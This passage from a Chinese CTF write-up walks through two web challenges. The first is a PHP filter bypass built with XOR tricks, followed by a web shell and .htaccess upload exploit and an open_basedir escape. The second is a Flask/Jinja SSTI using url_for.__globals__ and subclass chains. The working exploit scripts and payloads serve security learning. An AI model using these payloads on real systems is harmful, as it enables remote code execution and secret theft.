mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一题步骤蛮多，先过第一关的正则吧</p>
<p>过滤了一堆堆，看看还剩下啥</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">0</span>; $ascii &lt; <span class="number">256</span>; $ascii++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($ascii))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> bin2hex(chr($ascii));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">" "</span>.chr($ascii);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>符号还剩            ! # $ % ( ) * + - / : ; &lt; &gt; ? @ \ ] ^ { } </p>
<p>然后就是            0x80 - 0x255的不可见字符了</p>
<p>大佬的思路是：</p>
<p>这里还有个^符合，所以想用剩下的字符异或构造出$_GET</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'0xfe'</span></span><br><span class="line">str2=<span class="string">'0x'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">126</span>,<span class="number">256</span>):</span><br><span class="line">    str2=hex(i)</span><br><span class="line">    <span class="keyword">if</span>(hex(int(str1,<span class="number">16</span>)^int(str2,<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">2</span>).decode(<span class="string">'hex'</span>)<span class="keyword">in</span> [<span class="string">'_'</span>,<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>]):</span><br><span class="line">        <span class="keyword">print</span> str1</span><br><span class="line">        <span class="keyword">print</span> str2</span><br><span class="line">        <span class="keyword">print</span> hex(int(str1,<span class="number">16</span>)^int(str2,<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">2</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'--------------------------'</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#fefefefe^a1b9bbaa =&gt; _GET</span></span><br></pre></td></tr></table></figure>

<p>于是payload：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=<span class="variable">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;</span>&#123;%fe&#125;();&amp;%fe=get_the_flag</span><br></pre></td></tr></table></figure>

<p>为啥是百分号呢？我复制过来typora说这是bash脚本？求大佬指教。</p>
<p>这样子就进入了get_the_flag类</p>
<p>可是没有上传提交按钮啊？</p>
<p>可以用脚本强行提交</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">content = <span class="string">b""</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'content.php'</span>,content,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>或者可以写表单</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://p9qfbhq6roarctf.4hou.com.cn:40895/index.php/home/index/upload"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么接下来就要绕过文件的检测，</p>
<ol>
<li><p>内容匹配-&gt;base64绕过</p>
</li>
<li><p>类型匹配-&gt;文件头绕过</p>
</li>
</ol>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://021fdd49-ed99-4c0b-b4cf-36d0a614e65d.node2.buuoj.cn.wetolink.com/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://021fdd49-ed99-4c0b-b4cf-36d0a614e65d.node2.buuoj.cn.wetolink.com/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .cc</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_3b36b9a7eff434ee5fe0601c22a1eaf6/shell.cc"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">b"\x00\x00\x8a\x39\x8a\x3900PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg=="</span>)</span><br><span class="line"><span class="comment">#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">r = requests.post(url=url, data=data, files=files)<span class="comment">#proxies=proxies)</span></span><br><span class="line">print(r.text) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'shell.cc'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>先传一个base64的shell，可以得到你的临时目录路径，然后再传.htaccess文件，解析你自己上传的base64 shell</p>
<p>（脚本中application/x-httpd-php .cc，这一句给.cc转为php解析感觉其实可以略去）</p>
<p>然后这里在buuoj复现的时候遇到了一个非预期，直接看phpinfo()就可以看到flag 23333</p>
<p>所以其实第一步的时候就可以直接get flag23333</p>
<p>正常的话，看大佬们的wp应该还是有一个open_basedir限制</p>
<p>这个绕过之前也遇到过</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'img'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">print_r</span>(scandir(<span class="string">'/'</span>));</span><br><span class="line">#绕后用<span class="selector-tag">file_get_contents</span>读就好了</span><br></pre></td></tr></table></figure>

<p>所以最终能拿到flag 的payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">42</span>dce2c1-fd1a-<span class="number">4879</span>-<span class="number">9833</span>-b37a180bec78.node2.buuoj.cn.wetolink.com<span class="regexp">/upload/</span>tmp_3b36b9a7eff434ee5fe0601c22a1eaf6<span class="regexp">/shell.cc?c=chdir('/</span>tmp<span class="string">');mkdir('</span>sky<span class="string">');chdir('</span>sky<span class="string">');ini_set('</span>open_basedi<span class="string">r','</span>..<span class="string">');chdir('</span>..<span class="string">');chdir('</span>..<span class="string">');chdir('</span>..<span class="string">');chdir('</span>..<span class="string">');ini_set('</span>open_basedi<span class="string">r','</span><span class="regexp">/');print_r(file_get_contents('/</span>THis_Is_tHe_F14g<span class="string">'));</span></span><br></pre></td></tr></table></figure>

<h3 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h3><p>再见SSTI，表示根本没看出来，看着wp全程懵逼，要不是拿到flag的操作简单，我是不会看下去的233333</p>
<p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>首先index这个没啥用，略~</p>
<p>flag应该在这里<strong>app.config[‘FLAG’]</strong>，不然后面禁用config干嘛</p>
<p>所以目的，想办法读到config[‘FLAG’]</p>
<p>然后safe_jinja(s)这个函数，首先去掉了s里的括号，然后返回：</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">'flag&#123;2333&#125;'</span></span><br><span class="line">s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">print <span class="string">''</span>.<span class="built_in">join</span>([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="built_in">in</span> blacklist])+s</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#123;% <span class="built_in">set</span> config=None%&#125;&#123;% <span class="built_in">set</span> self=None%&#125;<span class="built_in">flag</span>&#123;<span class="number">2333</span>&#125;</span><br></pre></td></tr></table></figure>

<p>查询flask.render_template_string这个不认识的函数<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">https://www.freebuf.com/column/187845.html</a></p>
<p>了解到不正确的使用flask中的<code>render_template_string</code>方法会引发SSTI。</p>
<h4 id="xss利用"><a href="#xss利用" class="headerlink" title="xss利用"></a>xss利用</h4><p>存在漏洞的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/test/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">    html = <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    '''</span>%(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure>

<p>将代码改为如下,则可避免</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/test/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    code = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">'&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;'</span>,code=code)</span><br></pre></td></tr></table></figure>

<p>我们的输入就是拼接在这个后面了，</p>
<p>我们试试4</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://76e97f83-2c6d-49f4-821a-ffe4f1eb32ca.node2.buuoj.cn.wetolink.com:<span class="number">82</span>/shrine/%7B%<span class="number">7B2</span>*<span class="number">2</span>%7D%7D</span><br></pre></td></tr></table></figure>

<p>成功返回了4，那么的确存在SSTI</p>
<p>所以，接下来呢？有哪些姿势？config 和 self 都被置None了，</p>
<h4 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h4><p>参考：<a href="https://ctftime.org/writeup/10895" target="_blank" rel="noopener">https://ctftime.org/writeup/10895</a></p>
<ol>
<li><p>If I can use config</p>
<p>GET /shrine/ </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Config &#123;<span class="string">'JSON_AS_ASCII'</span>: <span class="literal">True</span>, <span class="string">'USE_X_SENDFILE'</span>: <span class="literal">False</span>, <span class="string">'SESSION_COOKIE_SECURE'</span>: <span class="literal">False</span>, <span class="string">'SESSION_COOKIE_PATH'</span>: <span class="literal">None</span>, <span class="string">'SESSION_COOKIE_DOMAIN'</span>: <span class="literal">None</span>, <span class="string">'SESSION_COOKIE_NAME'</span>: <span class="string">'session'</span>, <span class="string">'MAX_COOKIE_SIZE'</span>: <span class="number">4093</span>, <span class="string">'SESSION_COOKIE_SAMESITE'</span>: <span class="literal">None</span>, <span class="string">'PROPAGATE_EXCEPTIONS'</span>: <span class="literal">None</span>, <span class="string">'ENV'</span>: <span class="string">'production'</span>, <span class="string">'DEBUG'</span>: <span class="literal">True</span>, <span class="string">'SECRET_KEY'</span>: <span class="literal">None</span>, <span class="string">'EXPLAIN_TEMPLATE_LOADING'</span>: <span class="literal">False</span>, <span class="string">'MAX_CONTENT_LENGTH'</span>: <span class="literal">None</span>, <span class="string">'APPLICATION_ROOT'</span>: <span class="string">'/'</span>, <span class="string">'SERVER_NAME'</span>: <span class="literal">None</span>, <span class="string">'FLAG'</span>: <span class="string">'TWCTF&#123;secret&#125;'</span>, <span class="string">'PREFERRED_URL_SCHEME'</span>: <span class="string">'http'</span>, <span class="string">'JSONIFY_PRETTYPRINT_REGULAR'</span>: <span class="literal">False</span>, <span class="string">'TESTING'</span>: <span class="literal">False</span>, <span class="string">'PERMANENT_SESSION_LIFETIME'</span>: datetime.timedelta(<span class="number">31</span>), <span class="string">'TEMPLATES_AUTO_RELOAD'</span>: <span class="literal">None</span>, <span class="string">'TRAP_BAD_REQUEST_ERRORS'</span>: <span class="literal">None</span>, <span class="string">'JSON_SORT_KEYS'</span>: <span class="literal">True</span>, <span class="string">'JSONIFY_MIMETYPE'</span>: <span class="string">'application/json'</span>, <span class="string">'SESSION_COOKIE_HTTPONLY'</span>: <span class="literal">True</span>, <span class="string">'SEND_FILE_MAX_AGE_DEFAULT'</span>: datetime.timedelta(<span class="number">0</span>, <span class="number">43200</span>), <span class="string">'PRESERVE_CONTEXT_ON_EXCEPTION'</span>: <span class="literal">None</span>, <span class="string">'SESSION_REFRESH_EACH_REQUEST'</span>: <span class="literal">True</span>, <span class="string">'TRAP_HTTP_EXCEPTIONS'</span>: <span class="literal">False</span>&#125;&gt;</span><br></pre></td></tr></table></figure>

<p><code></code> ⇒TWCTF{secret}</p>
</li>
<li><p>If I can use self</p>


<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'_TemplateReference__context'</span>: &lt;Context &#123;<span class="string">'url_for'</span>: &lt;function url_for at <span class="number">0x7f67e7d0cb90</span>&gt;, <span class="string">'g'</span>: &lt;flask.g <span class="keyword">of</span> <span class="string">'main'</span>&gt;, <span class="string">'request'</span>: &lt;Request <span class="string">'http://my_server/shrine/&#123;&#123;self.__dict__&#125;&#125;'</span> [GET]&gt;, <span class="string">'namespace'</span>: &lt;<span class="keyword">class</span> <span class="string">'jinja2.utils.Namespace'</span>&gt;, <span class="string">'lipsum'</span>: &lt;function generate_lorem_ipsum at <span class="number">0x7f67e8dc2c08</span>&gt;, <span class="string">'aaaa'</span>: None, <span class="string">'range'</span>: &lt;type <span class="string">'xrange'</span>&gt;, <span class="string">'session'</span>: &lt;NullSession &#123;&#125;&gt;, <span class="string">'dict'</span>: &lt;type <span class="string">'dict'</span>&gt;, <span class="string">'get_flashed_messages'</span>: &lt;function get_flashed_messages at <span class="number">0x7f67e7d0ccf8</span>&gt;, <span class="string">'cycler'</span>: &lt;<span class="keyword">class</span> <span class="string">'jinja2.utils.Cycler'</span>&gt;, <span class="string">'joiner'</span>: &lt;<span class="keyword">class</span> <span class="string">'jinja2.utils.Joiner'</span>&gt;, <span class="string">'config'</span>: &lt;Config &#123;<span class="string">'JSON_AS_ASCII'</span>: <span class="literal">True</span>, <span class="string">'USE_X_SENDFILE'</span>: <span class="literal">False</span>, <span class="string">'SESSION_COOKIE_SECURE'</span>: <span class="literal">False</span>, <span class="string">'SESSION_COOKIE_PATH'</span>: None, <span class="string">'SESSION_COOKIE_DOMAIN'</span>: None, <span class="string">'SESSION_COOKIE_NAME'</span>: <span class="string">'session'</span>, <span class="string">'MAX_COOKIE_SIZE'</span>: <span class="number">4093</span>, <span class="string">'SESSION_COOKIE_SAMESITE'</span>: None, <span class="string">'PROPAGATE_EXCEPTIONS'</span>: None, <span class="string">'ENV'</span>: <span class="string">'production'</span>, <span class="string">'DEBUG'</span>: <span class="literal">True</span>, <span class="string">'SECRET_KEY'</span>: None, <span class="string">'EXPLAIN_TEMPLATE_LOADING'</span>: <span class="literal">False</span>, <span class="string">'MAX_CONTENT_LENGTH'</span>: None, <span class="string">'APPLICATION_ROOT'</span>: <span class="string">'/'</span>, <span class="string">'SERVER_NAME'</span>: None, <span class="string">'FLAG'</span>: <span class="string">'TWCTF&#123;secret&#125;'</span>, <span class="string">'PREFERRED_URL_SCHEME'</span>: <span class="string">'http'</span>, <span class="string">'JSONIFY_PRETTYPRINT_REGULAR'</span>: <span class="literal">False</span>, <span class="string">'TESTING'</span>: <span class="literal">False</span>, <span class="string">'PERMANENT_SESSION_LIFETIME'</span>: datetime.timedelta(<span class="number">31</span>), <span class="string">'TEMPLATES_AUTO_RELOAD'</span>: None, <span class="string">'TRAP_BAD_REQUEST_ERRORS'</span>: None, <span class="string">'JSON_SORT_KEYS'</span>: <span class="literal">True</span>, <span class="string">'JSONIFY_MIMETYPE'</span>: <span class="string">'application/json'</span>, <span class="string">'SESSION_COOKIE_HTTPONLY'</span>: <span class="literal">True</span>, <span class="string">'SEND_FILE_MAX_AGE_DEFAULT'</span>: datetime.timedelta(<span class="number">0</span>, <span class="number">43200</span>), <span class="string">'PRESERVE_CONTEXT_ON_EXCEPTION'</span>: None, <span class="string">'SESSION_REFRESH_EACH_REQUEST'</span>: <span class="literal">True</span>, <span class="string">'TRAP_HTTP_EXCEPTIONS'</span>: <span class="literal">False</span>&#125;&gt;&#125; <span class="keyword">of</span> None&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>‘FLAG’: ‘TWCTF{secret}’</p>
</li>
<li><p>If I can use   (  )</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">59</span>](<span class="link"></span>).<span class="emphasis">_module._</span><span class="emphasis">_builtins_</span><span class="emphasis">_['_</span><span class="emphasis">_import_</span><span class="emphasis">_']("os")._</span><span class="emphasis">_dict_</span>_.environ['FLAG']</span><br><span class="line"></span><br><span class="line">().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">59</span>].<span class="strong">__init__</span>.func<span class="emphasis">_globals.values()[13]['eval']('_</span><span class="emphasis">_import_</span><span class="emphasis">_("os")._</span><span class="emphasis">_dict_</span>_.environ['FLAG']</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[].<span class="strong">__class__</span>.<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[68].<span class="strong">__init__</span>.<span class="strong">__globals__</span>['os'].<span class="strong">__dict__</span>.environ['FLAG']</span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>   Since config, self ( and ) can not be used, in order to get config information, it is necessary to access config from its upper global variable (current_app etc.).</p>
<p>参考wp：<a href="https://www.codercto.com/a/24487.html" target="_blank" rel="noopener">https://www.codercto.com/a/24487.html</a></p>
<p>首先，介绍一个很牛逼的函数，叫做url_for,可以参考flask的官方文档 <a href="http://flask.pocoo.org/docs/1.0/api/#flask.url_forbaobaoer.cn/archives/656/python-b2e7b180e9b880e793" target="_blank" rel="noopener">flask.url_for</a></p>
<p>在它引用的内容中，有着 current_app 的全局变量（查看引用：.__globals__）</p>
<p>url_for.<em>_globals_\</em></p>
<p>除此之外，还有函数包含了 current_app ，叫做 get_flashed_messages ，同样，可以参考官方文档 <a href="http://flask.pocoo.org/docs/1.0/api/#flask.get_flashed_messages" target="_blank" rel="noopener">flask.get_flashed_messages</a></p>
<p>payload</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET</span> /shrine/&#123;&#123;url_for.<span class="symbol">__globals__</span>[<span class="string">'current_app'</span>].config[<span class="string">'FLAG'</span>]&#125;&#125;</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line"><span class="symbol">GET</span> /shrine/&#123;&#123;get_flashed_messages.<span class="symbol">__globals__</span>[<span class="string">'current_app'</span>].config[<span class="string">'FLAG'</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>所以，要如何找到引用了current_app的函数呢，之前php类似的，学长给了个方法，python嘞？菜鸡恳请大佬赐教。</p>
